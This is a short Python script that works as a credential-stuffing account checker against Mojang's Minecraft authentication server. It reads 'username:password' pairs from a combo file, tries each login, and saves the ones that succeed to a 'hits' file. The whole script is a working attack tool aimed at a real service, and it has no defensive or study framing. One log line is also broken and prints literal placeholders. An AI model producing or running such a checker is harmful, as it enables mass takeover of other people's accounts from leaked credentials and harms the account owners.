import json
import logging
import requests

LOG_FORMAT = "[%(asctime)s] %(levelname)s: %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT, datefmt="%H:%M:%S")
log = logging.getLogger(__name__)

def login(username, password):
	url = "https://authserver.mojang.com/authenticate"
	payload = {
		"agent": {
			"name": "Minecraft",
			"version": 1
		},
		"username": username,
		"password": password
	}

	try:
		resp = requests.post(url, json=payload, headers={"Content-Type": "application/json"})
	except:
		log.error("An error has occured whilst POSTing to Minecraft")
		return

	if resp.status_code == 403:
		log.error("Account information is wrong (or you're shadowbanned)")

	json_data = json.loads(resp.text)

	if "selectedProfile" in json_data:
		log.info("{username}:{password} was successfully logged into")
		return True

if __name__ == "__main__":
	for user in open('users.txt', 'r').read().split('\n'):
		user_data = user.split(':')
		if login(user_data[0], user_data[1]):
			file = open('hits.txt', 'a')
			file.write(user + "\n")
			file.close()
